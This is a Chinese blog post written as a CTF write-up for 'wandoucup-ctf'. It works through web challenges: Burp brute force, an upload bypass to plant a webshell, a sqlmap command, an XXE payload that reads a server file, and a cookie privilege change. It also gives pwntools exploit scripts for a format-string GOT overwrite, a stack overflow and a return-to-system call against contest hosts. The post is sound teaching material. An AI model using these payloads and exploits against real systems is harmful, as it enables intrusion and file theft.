<!DOCTYPE HTML>
<html lang="zh-CN">
<head>
    <head>
    <meta charset="utf-8">
    <meta name="keywords" content="肖亦枫, hexo-theme-matery">
    <meta name="description" content="所有的幸福后面,都有人在负重前行.">
    <meta http-equiv="X-UA-Compatible" content="IE=edge">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <meta name="renderer" content="webkit|ie-stand|ie-comp">
    <meta name="mobile-web-app-capable" content="yes">
    <meta name="format-detection" content="telephone=no">
    <meta name="apple-mobile-web-app-capable" content="yes">
    <meta name="apple-mobile-web-app-status-bar-style" content="black-translucent">
    <title>Yof3ng&#39;s Blog | 热爱分享</title>
    <link rel="icon" type="image/png" href="/favicon.png">

    <link rel="stylesheet" type="text/css" href="/libs/awesome/css/font-awesome.min.css">
    <link rel="stylesheet" type="text/css" href="/libs/materialize/css/materialize.min.css">
    <link rel="stylesheet" type="text/css" href="/libs/aos/aos.css">
    <link rel="stylesheet" type="text/css" href="/libs/animate/animate.min.css">
    <link rel="stylesheet" type="text/css" href="/libs/lightGallery/css/lightgallery.min.css">
    <link rel="stylesheet" type="text/css" href="/css/matery.css">
    <link rel="stylesheet" type="text/css" href="/css/my.css">

    <script src="/libs/jquery/jquery-2.2.0.min.js"></script>
<link rel="stylesheet" href="/css/prism-tomorrow.css" type="text/css"></head>
</head>

<body>

<header class="navbar-fixed">
    <nav id="headNav" class="bg-color nav-transparent">
        <div id="navContainer" class="container">
            <div class="nav-wrapper">
                <div class="brand-logo">
                    <a href="/" class="waves-effect waves-light">
                        
                        <img src="/medias/logo.png" class="logo-img hide-on-small-only">
                        
                        <span class="logo-span">Yof3ng's Blog | 热爱分享</span>
                    </a>
                </div>
                <a href="#" data-activates="mobile-nav" class="button-collapse"><i class="fa fa-navicon"></i></a>
<ul class="right">
    
    <li class="hide-on-med-and-down">
        <a href="/" class="waves-effect waves-light">
            
            <i class="fa fa-home"></i>
            
            <span>home(主页)</span>
        </a>
    </li>
    
    <li class="hide-on-med-and-down">
        <a href="/tags" class="waves-effect waves-light">
            
            <i class="fa fa-tags"></i>
            
            <span>tags(标签)</span>
        </a>
    </li>
    
    <li class="hide-on-med-and-down">
        <a href="/categories" class="waves-effect waves-light">
            
            <i class="fa fa-bookmark"></i>
            
            <span>categories(目录)</span>
        </a>
    </li>
    
    <li class="hide-on-med-and-down">
        <a href="/archives" class="waves-effect waves-light">
            
            <i class="fa fa-archive"></i>
            
            <span>archives(归档)</span>
        </a>
    </li>
    
    <li class="hide-on-med-and-down">
        <a href="/about" class="waves-effect waves-light">
            
            <i class="fa fa-user-circle-o"></i>
            
            <span>about(关于)</span>
        </a>
    </li>
    
    <li>
        <a id="toggleSearch" class="waves-effect waves-light">
            <i id="searchIcon" class="mdi-action-search"></i>
        </a>
    </li>

</ul>

<div class="side-nav" id="mobile-nav">

    <div class="mobile-head bg-color">
        
        <img src="/medias/logo.png" class="logo-img circle responsive-img">
        
        <div class="logo-name">Yof3ng's Blog | 热爱分享</div>
        <div class="logo-desc">
            
            所有的幸福后面,都有人在负重前行.
            
        </div>
    </div>

    <ul class="menu-list mobile-menu-list">
        
        <li>
            <a href="/" class="waves-effect waves-light">
                
                <i class="fa fa-fw fa-home"></i>
                
                home(主页)
            </a>
        </li>
        
        <li>
            <a href="/tags" class="waves-effect waves-light">
                
                <i class="fa fa-fw fa-tags"></i>
                
                tags(标签)
            </a>
        </li>
        
        <li>
            <a href="/categories" class="waves-effect waves-light">
                
                <i class="fa fa-fw fa-bookmark"></i>
                
                categories(目录)
            </a>
        </li>
        
        <li>
            <a href="/archives" class="waves-effect waves-light">
                
                <i class="fa fa-fw fa-archive"></i>
                
                archives(归档)
            </a>
        </li>
        
        <li>
            <a href="/about" class="waves-effect waves-light">
                
                <i class="fa fa-fw fa-user-circle-o"></i>
                
                about(关于)
            </a>
        </li>
        
        
        <li><div class="divider"></div></li>
        <li>
            <a href="https://github.com/yof3ng" class="waves-effect waves-light" target="_blank">
                <i class="fa fa-github-square fa-fw"></i>Fork Me
            </a>
        </li>
        
    </ul>

    <div class="social-link"><a href="https://github.com/yof3ng" class="tooltipped" target="_blank" data-tooltip="访问我的GitHub" data-position="top" data-delay="50">
    <i class="fa fa-github"></i>
</a>
<a href="mailto:yof3ng@gmail.com" class="tooltipped" target="_blank" data-tooltip="邮件联系我" data-position="top" data-delay="50">
    <i class="fa fa-envelope-open"></i>
</a>
<a href="#!" class="tooltipped" data-tooltip="QQ联系我: 877153299" data-position="top" data-delay="50">
    <i class="fa fa-qq"></i>
</a>

<a href="/atom.xml" class="tooltipped" target="_blank" data-tooltip="RSS 订阅" data-position="top" data-delay="50">
    <i class="fa fa-rss"></i>
</a>
</div>
</div>

            </div>
        </div>

        
        <style>
    .nav-transparent .github-corner {
        display: none !important;
    }

    .github-corner {
        position: absolute;
        z-index: 10;
        top: 0;
        right: 0;
        border: 0;
        transform: scale(1.1);
    }

    .github-corner svg {
        color: #0f9d58;
        fill: #fff;
        height: 64px;
        width: 64px;
    }

    .github-corner:hover .octo-arm {
        animation: a 0.56s ease-in-out;
    }

    .github-corner .octo-arm {
        animation: none;
    }

    @keyframes a {
        0%,
        to {
            transform: rotate(0);
        }
        20%,
        60% {
            transform: rotate(-25deg);
        }
        40%,
        80% {
            transform: rotate(10deg);
        }
    }
</style>

<a href="https://github.com/yof3ng" class="github-corner tooltipped hide-on-med-and-down" target="_blank"
   data-tooltip="Fork Me" data-position="left" data-delay="50">
    <svg viewBox="0 0 250 250" aria-hidden="true">
        <path d="M0,0 L115,115 L130,115 L142,142 L250,250 L250,0 Z"></path>
        <path d="M128.3,109.0 C113.8,99.7 119.0,89.6 119.0,89.6 C122.0,82.7 120.5,78.6 120.5,78.6 C119.2,72.0 123.4,76.3 123.4,76.3 C127.3,80.9 125.5,87.3 125.5,87.3 C122.9,97.6 130.6,101.9 134.4,103.2"
              fill="currentColor" style="transform-origin: 130px 106px;" class="octo-arm"></path>
        <path d="M115.0,115.0 C114.9,115.1 118.7,116.5 119.8,115.4 L133.7,101.6 C136.9,99.2 139.9,98.4 142.2,98.6 C133.8,88.0 127.5,74.4 143.8,58.0 C148.5,53.4 154.0,51.2 159.7,51.0 C160.3,49.4 163.2,43.6 171.4,40.1 C171.4,40.1 176.1,42.5 178.8,56.2 C183.1,58.6 187.2,61.8 190.9,65.4 C194.5,69.0 197.7,73.2 200.1,77.6 C213.8,80.2 216.3,84.9 216.3,84.9 C212.7,93.1 206.9,96.0 205.4,96.6 C205.1,102.4 203.0,107.8 198.3,112.5 C181.9,128.9 168.3,122.5 157.7,114.1 C157.9,116.9 156.7,120.9 152.7,124.9 L141.0,136.5 C139.8,137.7 141.6,141.9 141.8,141.8 Z"
              fill="currentColor" class="octo-body"></path>
    </svg>
</a>
        
    </nav>
</header>



<div class="bg-cover post-cover" style="background-image: url('/medias/featureimages/16.jpg')">
    <div class="container">
        <div class="row">
            <div class="col s12 m12 l12">
                <div class="brand">
                    <div class="description center-align post-title">
                        wandoucup-ctf
                    </div>
                </div>
            </div>
        </div>
    </div>
</div>



<main class="post-container content">

    
    <style>
    #artDetail h1,
    #artDetail h2,
    #artDetail h3,
    #artDetail h4,
    #artDetail h5,
    #artDetail h6 {
        padding-top: 76px;
        margin-top: -76px;
    }

    #artDetail h1 {
        line-height: 3.3rem;
    }

    #artDetail h2 {
        line-height: 3rem;
    }

    #artDetail h3 {
        line-height: 2.5rem;
    }

    #artDetail h4 {
        line-height: 2.2rem;
    }

    #artDetail h5 {
        line-height: 1.9rem;
    }

    .toc-fixed {
        position: fixed;
        top: 64px;
    }

    .toc-widget {
        padding-left: 20px;
    }

    .toc-widget ol {
        padding: 0;
        list-style: none;
    }

    .post-toc ol {
        padding-left: 20px;
    }

    .post-toc a {
        color: #34495e;
        font-size: 0.96rem;
    }

    .post-toc a:hover {
        color: #42b983;
        text-decoration: underline;
    }

    .post-toc .active {
        color: #42b983;
        font-weight: 500;
    }
</style>
<div class="row">
    <div class="col s12 m12 l9">
        <!-- 文章内容详情 -->
<div id="artDetail">
    <div class="card">
        <div class="card-content article-info">
            
            <div class="article-tag">
                
                <a href="/tags/Pwn/" target="_blank">
                    <span class="chip bg-color">Pwn</span>
                </a>
                
                <a href="/tags/CTF/" target="_blank">
                    <span class="chip bg-color">CTF</span>
                </a>
                
                <a href="/tags/流量分析/" target="_blank">
                    <span class="chip bg-color">流量分析</span>
                </a>
                
            </div>
            
            <div class="post-info">
                
                <span class="post-cate">
                    <i class="fa fa-bookmark fa-fw icon-category"></i>
                    
                    <a href="/categories/CTF/" class="post-category" target="_blank">
                        CTF
                    </a>
                    
                </span>
                

                <span class="post-date">
                    <i class="fa fa-clock-o fa-fw"></i>2018-10-28
                </span>
            </div>
        </div>
        <hr>
        <div class="card-content article-card-content">
            <div id="articleContent">
                <p>[TOC]</p>
<h1 id="wandoucup-ctf"><a href="#wandoucup-ctf" class="headerlink" title="wandoucup-ctf"></a>wandoucup-ctf</h1><blockquote>
<p>这两天在打一个稍微简单的CTF，写个writeup记录一下被虐的过程😭，总的来说这场小赛是个大杂烩，毕竟你懂的😏，作为做题者我们当然是有题做就ok的。</p>
<p>由于比赛后环境关闭，所以有的无图片展示，现有的图片是下午就准备写writeup截的图。</p>
</blockquote>
<h2 id="web"><a href="#web" class="headerlink" title="web"></a>web</h2><h3 id="web1-签到题"><a href="#web1-签到题" class="headerlink" title="web1-签到题"></a>web1-签到题</h3><p><a href="http://101.231.137.47:20001/" target="_blank" rel="noopener">题目链接</a></p>
<blockquote>
<p>跟某几个ctf练习平台上面的滑稽题一样：</p>
<p><img src="https://i.loli.net/2018/10/28/5bd55a6403431.png" alt=""></p>
</blockquote>
<p>一键获取flag😄。</p>
<h3 id="web2-输入密码查看flag"><a href="#web2-输入密码查看flag" class="headerlink" title="web2-输入密码查看flag"></a>web2-输入密码查看flag</h3><p><a href="http://101.231.137.47:20002/4.php" target="_blank" rel="noopener">题目链接</a></p>
<blockquote>
<p>简单浏览一下，就是一个爆破的题：</p>
<p><img src="https://i.loli.net/2018/10/28/5bd56b3b1d5b7.png" alt=""></p>
<p>密码为五位数，那我们直接上burpsuite咯：设置长度和payload字符：</p>
<p><img src="https://i.loli.net/2018/10/28/5bd56b9a814dd.png" alt=""></p>
<p><img src="https://i.loli.net/2018/10/28/5bd590f273c5b.png" alt=""></p>
<p>GET FLAG!</p>
</blockquote>
<h3 id="web3-这真能传马？"><a href="#web3-这真能传马？" class="headerlink" title="web3-这真能传马？"></a>web3-这真能传马？</h3><p><a href="http://101.231.137.47:20003/" target="_blank" rel="noopener">题目链接</a></p>
<blockquote>
<p>简单地抓包修改参数，从而使得自己能够传php，我直接上了一个大马，然后看/opt/flag.txt。</p>
<p><img src="https://i.loli.net/2018/10/28/5bd56d1fde396.png" alt=""></p>
<p>抓包可以看到url中的ext参数传递的是文件类型，猜测是可以修改，我们加个php到中间即可成功地直接上传webshell（很抠脚）。</p>
<p><img src="https://i.loli.net/2018/10/28/5bd56da602535.png" alt=""></p>
<p>然后再修改一下content-type即可：</p>
<p><img src="https://i.loli.net/2018/10/28/5bd56ea016a98.png" alt=""></p>
</blockquote>
<p>To /opt/flag.txt  get flag==&gt;😄</p>
<p><img src="https://i.loli.net/2018/10/28/5bd56ef831e0e.png" alt=""></p>
<h3 id="web4-这真能注入？"><a href="#web4-这真能注入？" class="headerlink" title="web4-这真能注入？"></a>web4-这真能注入？</h3><p>题目链接</p>
<blockquote>
<p>浏览一下，加个单引号试试就一个很明显的注入咯：</p>
<p><img src="https://i.loli.net/2018/10/28/5bd56f5203775.png" alt=""></p>
<p>直接sqlmap注入即可，<code>sqlmap -u http://101.231.137.47:20004/php/index.php?gid=1 --dbs</code></p>
<p>得到数据库名后直接逐步指定数据库表，指定字段，dump即可。</p>
<p>由于比赛后服务已经关闭故未能截取成功图片。</p>
</blockquote>
<h3 id="web5-API"><a href="#web5-API" class="headerlink" title="web5-API"></a>web5-API</h3><blockquote>
<p>这题是xxe外部实体注入，通过抓包，修改POST数据以及Content-type从而读取到/tmp/flag.txt。</p>
<blockquote>
<p>XXE漏洞就是服务器接受从客户端发送来的xml格式数据时，xml数据中恶意的引用了外部实体，将它的值绑定为服务器的目标文件，这样在服务器返回给我们解析后的值时，就会把目标文件的内容返回给我们，从而读取敏感文件内容。</p>
</blockquote>
<p>题目原本传输的<code>Content-type: application/json</code>改为<code>Content-type: application/xml</code>，并将POST的数据改为以下xml代码:</p>
<pre class=" language-xml"><code class="language-xml"><span class="token prolog">&lt;?xml version=”1.0″?></span>
<span class="token doctype">&lt;!DOCTYPE a[
&lt;!ENTITY xxe SYSTEM “file:///tmp/flag.txt”></span>
]>
<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>something</span><span class="token punctuation">></span></span><span class="token entity" title="&any;">&amp;any;</span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>something</span><span class="token punctuation">></span></span>
</code></pre>
<p>然后发送数据包，就可得到api返回的flag了。</p>
</blockquote>
<h3 id="web6-sweet-home"><a href="#web6-sweet-home" class="headerlink" title="web6-sweet home"></a>web6-sweet home</h3><blockquote>
<p>这道题有点东西，一步一步深入，到最后一个提示放出之后几分钟，迅速拿到flag。</p>
<p>步骤：登录和注册界面需要写脚本抛出对应规则的code，然后通过目录遍历得到部分页面源码以及一个目录(分别是<code>user.php~</code>， <code>config.php~</code>，<code>adminpic</code>)，根据源码可以得知adminpic是admin用户上传文件的一个目录，并且我们可以得到数据库账号密码，全端口扫描得到23306端口为数据库服务端口，登陆后得到admin账户密码，经过大半天的破解md5之后，得到提示<code>crypto.html</code>，这是一个指定的解密md5的页面，输入admin密码hash值破解得到提示<code>crypto.png</code>，访问得到二维码，扫描即可获得密码<code>wandouxueyuan:)</code>，用此密码可登录admin账户，来到上传图片publish页面，结合前面遍历得到的一个<code>adminpic</code>目录可以知道上传文件在此目录中，经过简单的绕过后上传大马即可。</p>
<p>傻傻的我还尝试文件包含，session_decode，以及register注册等等操作。</p>
<p><img src="https://i.loli.net/2018/10/28/5bd5d5ba033c9.png" alt=""></p>
</blockquote>
<p><img src="https://i.loli.net/2018/10/28/5bd5a2a3dd284.png" alt=""></p>
<p>传完马后访问/adminpic目录即可看到自己上传的文件，从而getshell拿到flag：</p>
<p><img src="https://i.loli.net/2018/10/28/5bd5d6ffa0abd.png" alt=""></p>
<h3 id="web附加题-atom"><a href="#web附加题-atom" class="headerlink" title="web附加题-atom"></a>web附加题-atom</h3><blockquote>
<p>这道web加餐题，实际上就是用给的账户密码登录后将cookie中的<code>admin=0</code>改为<code>admin=1</code>，然后会跳转到一个后台，然后查看后台源码即可得到真正的flag。</p>
</blockquote>
<h2 id="Pwn"><a href="#Pwn" class="headerlink" title="Pwn"></a>Pwn</h2><blockquote>
<p>三个pwn都非常经典，分别考察格式化字符串漏洞，简单的溢出，以及ret2sys几个知识点。</p>
</blockquote>
<h3 id="pwn1–格式化字符串漏洞"><a href="#pwn1–格式化字符串漏洞" class="headerlink" title="pwn1–格式化字符串漏洞"></a>pwn1–格式化字符串漏洞</h3><p>通过用IDA简单地分析一下逻辑，可以看到printf处存在格式化字符串漏洞：</p>
<pre class=" language-c"><code class="language-c"><span class="token macro property">#vuln_fun函数伪c代码</span>
<span class="token keyword">int</span> __cdecl <span class="token function">main</span><span class="token punctuation">(</span><span class="token keyword">int</span> argc<span class="token punctuation">,</span> <span class="token keyword">const</span> <span class="token keyword">char</span> <span class="token operator">*</span><span class="token operator">*</span>argv<span class="token punctuation">,</span> <span class="token keyword">const</span> <span class="token keyword">char</span> <span class="token operator">*</span><span class="token operator">*</span>envp<span class="token punctuation">)</span>
<span class="token punctuation">{</span>
  <span class="token keyword">int</span> v4<span class="token punctuation">;</span> <span class="token comment" spellcheck="true">// [esp-Ch] [ebp-7Ch]</span>
  <span class="token keyword">int</span> v5<span class="token punctuation">;</span> <span class="token comment" spellcheck="true">// [esp-8h] [ebp-78h]</span>
  <span class="token keyword">int</span> v6<span class="token punctuation">;</span> <span class="token comment" spellcheck="true">// [esp-4h] [ebp-74h]</span>
  <span class="token keyword">int</span> format<span class="token punctuation">;</span> <span class="token comment" spellcheck="true">// [esp+0h] [ebp-70h]</span>
  <span class="token keyword">int</span> v8<span class="token punctuation">;</span> <span class="token comment" spellcheck="true">// [esp+4h] [ebp-6Ch]</span>
  <span class="token keyword">int</span> v9<span class="token punctuation">;</span> <span class="token comment" spellcheck="true">// [esp+8h] [ebp-68h]</span>
  <span class="token keyword">int</span> v10<span class="token punctuation">;</span> <span class="token comment" spellcheck="true">// [esp+Ch] [ebp-64h]</span>
  <span class="token keyword">int</span> v11<span class="token punctuation">;</span> <span class="token comment" spellcheck="true">// [esp+10h] [ebp-60h]</span>
  <span class="token keyword">int</span> v12<span class="token punctuation">;</span> <span class="token comment" spellcheck="true">// [esp+14h] [ebp-5Ch]</span>
  <span class="token keyword">int</span> v13<span class="token punctuation">;</span> <span class="token comment" spellcheck="true">// [esp+18h] [ebp-58h]</span>
  <span class="token keyword">int</span> v14<span class="token punctuation">;</span> <span class="token comment" spellcheck="true">// [esp+1Ch] [ebp-54h]</span>
  <span class="token keyword">int</span> v15<span class="token punctuation">;</span> <span class="token comment" spellcheck="true">// [esp+20h] [ebp-50h]</span>
  <span class="token keyword">int</span> v16<span class="token punctuation">;</span> <span class="token comment" spellcheck="true">// [esp+24h] [ebp-4Ch]</span>
  <span class="token keyword">int</span> v17<span class="token punctuation">;</span> <span class="token comment" spellcheck="true">// [esp+28h] [ebp-48h]</span>
  <span class="token keyword">int</span> v18<span class="token punctuation">;</span> <span class="token comment" spellcheck="true">// [esp+2Ch] [ebp-44h]</span>
  <span class="token keyword">int</span> v19<span class="token punctuation">;</span> <span class="token comment" spellcheck="true">// [esp+30h] [ebp-40h]</span>
  <span class="token keyword">int</span> v20<span class="token punctuation">;</span> <span class="token comment" spellcheck="true">// [esp+34h] [ebp-3Ch]</span>
  <span class="token keyword">int</span> v21<span class="token punctuation">;</span> <span class="token comment" spellcheck="true">// [esp+38h] [ebp-38h]</span>
  <span class="token keyword">int</span> v22<span class="token punctuation">;</span> <span class="token comment" spellcheck="true">// [esp+3Ch] [ebp-34h]</span>
  <span class="token keyword">int</span> v23<span class="token punctuation">;</span> <span class="token comment" spellcheck="true">// [esp+40h] [ebp-30h]</span>
  <span class="token keyword">int</span> v24<span class="token punctuation">;</span> <span class="token comment" spellcheck="true">// [esp+44h] [ebp-2Ch]</span>
  <span class="token keyword">int</span> v25<span class="token punctuation">;</span> <span class="token comment" spellcheck="true">// [esp+48h] [ebp-28h]</span>
  <span class="token keyword">int</span> v26<span class="token punctuation">;</span> <span class="token comment" spellcheck="true">// [esp+4Ch] [ebp-24h]</span>
  <span class="token keyword">int</span> v27<span class="token punctuation">;</span> <span class="token comment" spellcheck="true">// [esp+50h] [ebp-20h]</span>
  <span class="token keyword">int</span> v28<span class="token punctuation">;</span> <span class="token comment" spellcheck="true">// [esp+54h] [ebp-1Ch]</span>
  <span class="token keyword">int</span> v29<span class="token punctuation">;</span> <span class="token comment" spellcheck="true">// [esp+58h] [ebp-18h]</span>
  <span class="token keyword">unsigned</span> <span class="token keyword">int</span> v30<span class="token punctuation">;</span> <span class="token comment" spellcheck="true">// [esp+64h] [ebp-Ch]</span>
  <span class="token keyword">int</span> <span class="token operator">*</span>v31<span class="token punctuation">;</span> <span class="token comment" spellcheck="true">// [esp+6Ch] [ebp-4h]</span>

  v31 <span class="token operator">=</span> <span class="token operator">&amp;</span>argc<span class="token punctuation">;</span>
  v30 <span class="token operator">=</span> <span class="token function">__readgsdword</span><span class="token punctuation">(</span><span class="token number">0x14u</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
  <span class="token function">memset</span><span class="token punctuation">(</span><span class="token operator">&amp;</span>format<span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">,</span> <span class="token number">0x64u</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
  <span class="token function">__isoc99_scanf</span><span class="token punctuation">(</span>
    <span class="token number">0</span><span class="token punctuation">,</span>
    <span class="token punctuation">(</span><span class="token keyword">int</span><span class="token punctuation">)</span><span class="token operator">&amp;</span>format<span class="token punctuation">,</span>
    <span class="token punctuation">(</span><span class="token keyword">int</span><span class="token punctuation">)</span><span class="token string">"%s"</span><span class="token punctuation">,</span>
    <span class="token punctuation">(</span><span class="token keyword">int</span><span class="token punctuation">)</span><span class="token operator">&amp;</span>format<span class="token punctuation">,</span>
    v4<span class="token punctuation">,</span>
    v5<span class="token punctuation">,</span>
    v6<span class="token punctuation">,</span>
    format<span class="token punctuation">,</span>
    v8<span class="token punctuation">,</span>
    v9<span class="token punctuation">,</span>
    v10<span class="token punctuation">,</span>
    v11<span class="token punctuation">,</span>
    v12<span class="token punctuation">,</span>
    v13<span class="token punctuation">,</span>
    v14<span class="token punctuation">,</span>
    v15<span class="token punctuation">,</span>
    v16<span class="token punctuation">,</span>
    v17<span class="token punctuation">,</span>
    v18<span class="token punctuation">,</span>
    v19<span class="token punctuation">,</span>
    v20<span class="token punctuation">,</span>
    v21<span class="token punctuation">,</span>
    v22<span class="token punctuation">,</span>
    v23<span class="token punctuation">,</span>
    v24<span class="token punctuation">,</span>
    v25<span class="token punctuation">,</span>
    v26<span class="token punctuation">,</span>
    v27<span class="token punctuation">,</span>
    v28<span class="token punctuation">,</span>
    v29<span class="token punctuation">)</span><span class="token punctuation">;</span>
  <span class="token function">printf</span><span class="token punctuation">(</span><span class="token punctuation">(</span><span class="token keyword">const</span> <span class="token keyword">char</span> <span class="token operator">*</span><span class="token punctuation">)</span><span class="token operator">&amp;</span>format<span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token comment" spellcheck="true">//格式化字符串漏洞</span>
  <span class="token function">fflush</span><span class="token punctuation">(</span>_bss_start<span class="token punctuation">)</span><span class="token punctuation">;</span>                <span class="token comment" spellcheck="true">//覆盖got表中fflush条目指向的地址，将其指向read_flag函数</span>
  <span class="token keyword">return</span> <span class="token number">0</span><span class="token punctuation">;</span>
<span class="token punctuation">}</span>
</code></pre>
<p>简单运行一下，我们可以构造语句：<code>aaaa-%p-%p-%p-%p-%p-%p-%p-%p</code>，然后输入得到：</p>
<p><img src="https://i.loli.net/2018/10/28/5bd5a6468eaa6.png" alt=""></p>
<p>可以看到我们的输入被放在了printf函数栈中的第6个位置（这里的%p是c/c++中格式化字符串的参数），格式化字符串漏洞最主要的危害就是可以获取任意地址内容，或者实现任意地址写，那么我们这就是通过任意地址写，来覆盖got表，之前的<a href="https://www.yof3ng.xyz/2018/10/26/Pwn-10%E6%9C%8826-Hitcon-%E5%9B%9B/">练习记录</a>中就提到了这些知识。</p>
<p>既然知道了利用位置，那么直接利用pwntools构造exp：</p>
<pre class=" language-python"><code class="language-python"><span class="token comment" spellcheck="true">#coding:utf-8</span>

<span class="token keyword">from</span> pwn <span class="token keyword">import</span> <span class="token operator">*</span>

context<span class="token punctuation">.</span>log_level <span class="token operator">=</span> <span class="token string">"debug"</span>

<span class="token comment" spellcheck="true">#io = process('./200')</span>
elf <span class="token operator">=</span> ELF<span class="token punctuation">(</span><span class="token string">'./200'</span><span class="token punctuation">)</span>
io <span class="token operator">=</span> remote<span class="token punctuation">(</span><span class="token string">'101.231.137.47'</span><span class="token punctuation">,</span><span class="token string">'20010'</span><span class="token punctuation">)</span>
<span class="token comment" spellcheck="true">#read_flag_addr = 0x0804859B</span>
read_flag_addr <span class="token operator">=</span> elf<span class="token punctuation">.</span>sym<span class="token punctuation">[</span><span class="token string">'read_flag'</span><span class="token punctuation">]</span>

<span class="token comment" spellcheck="true">#bss_addr = 0x0804A034</span>
got_printf_addr <span class="token operator">=</span> <span class="token number">0x0804A00c</span>
got_fflush_addr <span class="token operator">=</span> <span class="token number">0x0804A010</span>

<span class="token comment" spellcheck="true">#覆盖fflush地址指向的内容，从而实现read_flag跳转</span>
payload <span class="token operator">=</span> fmtstr_payload<span class="token punctuation">(</span><span class="token number">6</span><span class="token punctuation">,</span> <span class="token punctuation">{</span>got_fflush_addr<span class="token punctuation">:</span> <span class="token number">0x0804859B</span><span class="token punctuation">}</span><span class="token punctuation">)</span>    


io<span class="token punctuation">.</span>sendline<span class="token punctuation">(</span>payload<span class="token punctuation">)</span>
io<span class="token punctuation">.</span>interactive<span class="token punctuation">(</span><span class="token punctuation">)</span>

</code></pre>
<p>exp效果：</p>
<p><img src="https://i.loli.net/2018/10/28/5bd5919f74fc3.png" alt=""></p>
<h3 id="pwn2–栈溢出"><a href="#pwn2–栈溢出" class="headerlink" title="pwn2–栈溢出"></a>pwn2–栈溢出</h3><blockquote>
<p>简单的栈溢出啦，很常见的，找到溢出点然后把EIP指向我们的<code>win</code>函数地址即可:</p>
<p><img src="https://i.loli.net/2018/10/28/5bd5a81b27580.png" alt=""></p>
<p>通过<code>gdb-peda</code>,pattern模块，找到溢出偏移量为76，也就是说只需要构造<code>76*&#39;a&#39; + win_addr</code>即可:</p>
<p><img src="https://i.loli.net/2018/10/28/5bd5a40fae3f4.png" alt=""></p>
</blockquote>
<p>构造exp:</p>
<pre class=" language-python"><code class="language-python"><span class="token comment" spellcheck="true">#coding:utf-8</span>

<span class="token keyword">from</span> pwn <span class="token keyword">import</span> <span class="token operator">*</span>

context<span class="token punctuation">.</span>log_level <span class="token operator">=</span> <span class="token string">"debug"</span>

<span class="token comment" spellcheck="true">#ida中有win函数的地址</span>
win_addr <span class="token operator">=</span> <span class="token number">0x08048488</span>
<span class="token comment" spellcheck="true">#io = process('101.231.137.47',20011)</span>
io <span class="token operator">=</span> process<span class="token punctuation">(</span><span class="token string">'./100'</span><span class="token punctuation">)</span>
payload <span class="token operator">=</span> <span class="token number">76</span><span class="token operator">*</span><span class="token string">'a'</span> <span class="token operator">+</span> p32<span class="token punctuation">(</span>win_addr<span class="token punctuation">)</span>

io<span class="token punctuation">.</span>send<span class="token punctuation">(</span>payload<span class="token punctuation">)</span>
io<span class="token punctuation">.</span>interactive<span class="token punctuation">(</span><span class="token punctuation">)</span>
io<span class="token punctuation">.</span>close<span class="token punctuation">(</span><span class="token punctuation">)</span>


</code></pre>
<p>运行效果(因为环境已经关闭，所以只能展示本地效果):</p>
<p><img src="https://i.loli.net/2018/10/28/5bd5a99272847.png" alt=""></p>
<h3 id="pwn3–ret2syscall"><a href="#pwn3–ret2syscall" class="headerlink" title="pwn3–ret2syscall"></a>pwn3–ret2syscall</h3><blockquote>
<p>pwn3的话稍微比上面两题要难上一点点，不过还在我这个萌新的承受范围之内，先检查一下保护措施：</p>
<p><img src="https://i.loli.net/2018/10/28/5bd5ab2b01106.png" alt=""></p>
<p>可以看到只是开了栈不可执行 （NX)，静态分析一波:</p>
<p><img src="https://i.loli.net/2018/10/28/5bd5ab68bccdf.png" alt=""></p>
<p>这里我们也可以看到一个win_func函数，猜测同样是利用返回到该函数从而得到flag，那么如何返回到这个win_func函数呢？</p>
<p>我们注意到mem_test函数伪c代码如下:</p>
<p><img src="https://i.loli.net/2018/10/28/5bd5bef61db2e.png" alt=""></p>
<p>直接<code>return result</code>，那么如果有溢出存在，那我们能不能覆盖掉这个函数的返回地址呢，那当然是可行的(这题不能直接用pattern create得到偏移量，如果pattern过大则会导致无法覆盖eip），用gdb在mem_test函数下断点调试：</p>
<p><img src="https://i.loli.net/2018/10/28/5bd5cdf24a4fa.png" alt=""></p>
<p>然后根据之前ida分析变量s的位置为<code>ebp-0x13</code>,我们可以知道，<code>ebp = 0xffffd145 +0x13 = 0xffffd158</code>，或者直接在gdb看ebp的值，可以知道<code>0x8048718</code>就是return返回的地址。我们需要将它覆盖成win_func的地址。</p>
<p><img src="https://i.loli.net/2018/10/28/5bd5cec20e1ef.png" alt=""></p>
<p>而catflag地址就是一开始输出的那个hint:<code>0x080487E0</code></p>
</blockquote>
<p>构造exp：</p>
<pre class=" language-python"><code class="language-python">
<span class="token comment" spellcheck="true">#coding:utf-8</span>
Author <span class="token operator">=</span> <span class="token string">"Yof3ng"</span>

<span class="token keyword">from</span> pwn <span class="token keyword">import</span> <span class="token operator">*</span>
<span class="token keyword">import</span> sys
context<span class="token punctuation">.</span>binary <span class="token operator">=</span> <span class="token string">"./memory"</span>
context<span class="token punctuation">.</span>log_level <span class="token operator">=</span> <span class="token string">'debug'</span>
elf <span class="token operator">=</span> context<span class="token punctuation">.</span>binary
<span class="token comment" spellcheck="true">#io = process("./memory")</span>
io <span class="token operator">=</span> remote<span class="token punctuation">(</span><span class="token string">'101.231.137.47'</span><span class="token punctuation">,</span><span class="token string">'20012'</span><span class="token punctuation">)</span>
catflag <span class="token operator">=</span> <span class="token number">0x080487E0</span>
system_addr <span class="token operator">=</span> elf<span class="token punctuation">.</span>sym<span class="token punctuation">[</span><span class="token string">'win_func'</span><span class="token punctuation">]</span>
<span class="token keyword">print</span><span class="token punctuation">(</span>system_addr<span class="token punctuation">)</span>
<span class="token comment" spellcheck="true">#padding由栈空间和ebp(0x13+4)组成，system('cat flag')由system函数和catflag参数以及system返回地址组成</span>
payload <span class="token operator">=</span> flat<span class="token punctuation">(</span>cyclic<span class="token punctuation">(</span><span class="token number">0x17</span><span class="token punctuation">)</span><span class="token punctuation">,</span> system_addr<span class="token punctuation">,</span> <span class="token number">0x08048677</span><span class="token punctuation">,</span> catflag<span class="token punctuation">)</span>
<span class="token keyword">print</span><span class="token punctuation">(</span>payload<span class="token punctuation">)</span>
io<span class="token punctuation">.</span>sendline<span class="token punctuation">(</span>payload<span class="token punctuation">)</span>

io<span class="token punctuation">.</span>interactive<span class="token punctuation">(</span><span class="token punctuation">)</span>

</code></pre>
<p>运行效果：</p>
<p><img src="https://i.loli.net/2018/10/28/5bd592283dd2f.png" alt=""></p>
